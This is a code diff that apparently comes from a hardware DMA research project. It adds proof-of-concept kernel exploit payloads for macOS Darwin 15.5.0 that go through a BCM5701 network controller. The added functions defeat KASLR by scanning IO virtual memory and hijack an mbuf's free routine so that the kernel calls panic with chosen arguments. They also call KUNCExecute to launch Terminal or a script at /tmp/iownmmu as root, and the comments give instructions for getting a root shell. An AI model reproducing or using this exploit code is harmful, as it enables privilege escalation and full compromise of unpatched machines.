@@ -217,6 +217,10 @@ void BCM5701_own(uint32_t num_mbufs, void (*payload)(struct mbuf *)) {
 /** Offset for overwriteable space in a primed mbuf */
 #define MBUF_PRIMED_OFFSET MBUF_EXT_OFFSET + 8
 
+#define MSIZE (1<<8)
+#define _MLEN           (MSIZE - sizeof(struct m_hdr))  /* normal data len */
+#define _MHLEN          (_MLEN - sizeof(struct pkthdr)) /* data len w/pkthdr */
+
 
 /**
  * Prime an mbuf for its free routine and arguments to be overwritten. This function
@@ -461,3 +465,103 @@ void panic_14_5_0(struct mbuf *mb) {
   mbuf_inject(mb, PANIC_STATIC_KADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET,
       0x1337, 0xdeadbeef);
 }
+
+
+/**
+ * BCM5701 mbuf-based exploit payload that calls panic with arguments we control.
+ * Proof of concept exploit. In general, a payload takes in a pointer to an mbuf and
+ * modifies its free routine/arguments by making use of mbuf_prime() and mbuf_inject().
+ * Works for Darwin kernel version 15.5.0 (El Capitan).
+ *
+ * Parameters:
+ *  mb: pointer to an mbuf
+ */
+void panic_15_5_0(struct mbuf *mb) {
+  static uint64_t slide = 0;
+  if (slide == 0) {
+    // use the known static kernel address of gIOBMDPageAllocator (from Darwin 15.5.0) + 8,
+    // whose shifted kernel address should be exposed to IO virtual space by USB and
+    // AHCI drivers, to find the KASLR slide - find the address of symbols by calling
+    // nm on the kernel binary
+    const uint64_t gIOBMDPageAllocator_STATIC_KADDR = 0xffffff8000b283c8;
+    //0xffffff8000b28398;
+    printf("Finding KASLR slide...\n");
+    slide = iovirtual_window_explorer(0x0000, 0,
+        kaslr_slide_symbol_process, gIOBMDPageAllocator_STATIC_KADDR);
+  }
+
+  // the static kernel address of panic from Darwin 15.2.0
+  const uint64_t PANIC_STATIC_KADDR = 0xffffff80002daa30;
+  //0xffffff80002de6b0;
+
+  uint64_t mbuf_kern_ptr = mbuf_prime(mb);
+
+  // set up the format string "%x %x" at the next available 8 byte chunk after priming
+  *(uint64_t *)((char *)mb + MBUF_PRIMED_OFFSET) = 0x0000007825207825;
+
+  mbuf_inject(mb, PANIC_STATIC_KADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET,
+      0x1337, 0xdeadbeef);
+}
+
+
+
+/**
+ * Darwin 15.5.0 payload that calls KUNCExecute, a deprecated kernel function that
+ * takes in a path to an executable, a pid, and a gid, and runs the executable as the
+ * user specified by the pid/gid combination. To take advantage of this exploit, create
+ * a bash script (THAT MUST START WITH #!/bin/bash) at /tmp/iownmmu. When the payload is
+ * run, that script will be run as root. MAKE SURE THE SCRIPT IS EXECUTABLE!
+ *
+ * If you call the Terminal.app binary in this way, which is a useful way to get a root
+ * shell, you may need to click the Terminal icon in the dock then Apple-N to get a new
+ * window.
+ *
+ * Parameters:
+ *  mb: pointer to an mbuf
+ */
+void root_execute_15_5_0(struct mbuf *mb) {
+  static uint64_t slide = 0;
+  if (slide == 0) {
+    // use the known static kernel address of gIOBMDPageAllocator (from Darwin 15.2.0) + 8,
+    // whose shifted kernel address should be exposed to IO virtual space by USB and
+    // AHCI drivers, to find the KASLR slide - find the address of symbols by calling
+    // nm on the kernel binary
+    const uint64_t gIOBMDPageAllocator_STATIC_KADDR = 0xffffff8000b283c8;
+    printf("Finding KASLR slide...\n");
+    slide = iovirtual_window_explorer(0x0000, 0,
+        kaslr_slide_symbol_process, gIOBMDPageAllocator_STATIC_KADDR);
+  }
+
+  // the static kernel address of KUNCExecute from Darwin 15.5.0
+  const uint64_t KUNCExecute_STATIC_ADDR = 0xffffff80002b3530;
+  const uint64_t symlink_STATIC_ADDR = 0xffffff8000507c70;
+  const uint64_t iso_font_STATIC_ADDR = 0xffffff8000a522d0;
+  const uint64_t strcpy_STATIC_ADDR = 0xffffff800039b030;
+  const uint64_t atoi_STATIC_ADDR = 0xffffff800039b0c0;
+  const uint64_t atoi_term_STATIC_ADDR = 0xffffff800039b100;
+  const uint64_t gTimeZone_STATIC_ADDR = 0xffffff8000a76f98;
+  
+  uint64_t mbuf_kern_ptr = mbuf_prime(mb);
+
+//  struct symlink_args *uap = (struct symlink_args *) (mb + MBUF_PRIMED_OFFSET);
+
+  strcpy(((char *)mb + sizeof(struct m_hdr) + 32), "/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal");
+//  strcpy(((char *)mb - 256), "/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal");
+//  strcpy(((char *)mb + MBUF_PRIMED_OFFSET), "/Applications/TextEdit.app/Contents/MacOS/TextEdit");
+//  strcpy(((char *)mb - 256), "0");
+
+//  mbuf_inject(mb, atoi_term_STATIC_ADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET, 0, 0);
+//  printf("mbuf_kern_ptr = %16x %x, MBUF_PRIMED_OFFSEt = %d, _MLEN = %d, _MHLEN = %d\n", mbuf_kern_ptr, MBUF_PRIMED_OFFSET, _MLEN, _MHLEN);
+
+
+//  strcpy(((char *)mb + MBUF_PRIMED_OFFSET), "/tmp/iownmmu");
+
+  mbuf_inject(mb, KUNCExecute_STATIC_ADDR + slide, mbuf_kern_ptr + sizeof(struct m_hdr) + 32, 0, 0);
+
+/*  strcpy(((char *)mb + MBUF_PRIMED_OFFSET), "Terminal");
+*/
+//  mbuf_inject(mb, KUNCExecute_STATIC_ADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET, 0, 2);
+//  mbuf_inject(mb, KUNCExecute_STATIC_ADDR + slide, iso_font_STATIC_ADDR + slide, 0, 2);
+
+}
+
